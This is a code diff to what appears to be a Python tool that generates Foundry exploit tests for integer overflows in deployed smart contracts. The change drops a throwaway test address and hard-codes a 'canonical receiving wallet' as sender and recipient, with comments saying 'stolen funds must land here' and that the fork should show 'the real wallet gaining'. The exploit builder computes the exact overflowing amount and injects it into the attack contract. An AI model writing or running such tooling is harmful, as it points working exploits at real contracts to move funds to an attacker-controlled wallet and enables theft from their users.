@@ -413,8 +413,8 @@ import {{Test, console2, stdStorage, StdStorage}} from "forge-std/Test.sol";
 contract OverflowExploit is Test {{
     using stdStorage for StdStorage;
     address constant TARGET = {target};
+    address constant attacker = {attacker};   // canonical receiving wallet - stolen funds must land here
     function test_overflow() public {{
-        address attacker = makeAddr("attacker");
         uint256 amount = {amount};          // exact smallest overflowing input: amount*multiplier wraps to the ETH balance
         console2.log("OVF_AMOUNT", amount);
         console2.log("OVF_SUPPLY", uint256({supply}));
@@ -445,12 +445,13 @@ def build_overflow_reader(fn, target: str) -> str | None:
     return _OVERFLOW_READER.format(target=_addr_literal(target), mul=mul) if mul else None
 
 
-def build_overflow_literal(fn, target: str, amount: int, supply: int) -> str | None:
-    """Pass-2 exploit with the exact Python-computed overflowing amount injected into the attacker."""
+def build_overflow_literal(fn, target: str, amount: int, supply: int, wallet: str = ATTACKER_WALLET) -> str | None:
+    """Pass-2 exploit with the exact Python-computed overflowing amount injected into the CANONICAL wallet,
+    which is also msg.sender AND tx.origin and the ETH recipient - so the fork shows the real wallet gaining."""
     if fn is None or not _encodable(fn) or amount is None or amount <= 0:
         return None
-    return _OVERFLOW_EXPLOIT.format(target=_addr_literal(target), sell=canonical_sig(fn),
-                                    amount=int(amount), supply=int(supply))
+    return _OVERFLOW_EXPLOIT.format(target=_addr_literal(target), attacker=_addr_literal(wallet),
+                                    sell=canonical_sig(fn), amount=int(amount), supply=int(supply))
 
 
 def parse_overflow_reader(stdout: str):
@@ -544,7 +545,7 @@ def run_payloads(findings: list, files: list[SourceFile], target: str, rpc_url: 
                                    cwd=proj, capture_output=True, text=True, timeout=timeout)
                 read = parse_overflow_reader(r.stdout + "\n" + r.stderr)
                 amount = overflow_amount(read[2], read[0]) if (read and read[0] and read[2]) else None
-                lit = build_overflow_literal(fn, target, amount, read[1]) if (read and amount) else None
+                lit = build_overflow_literal(fn, target, amount, read[1], wallet) if (read and amount) else None
                 if lit is None:
                     verdicts.append(static)
                     continue
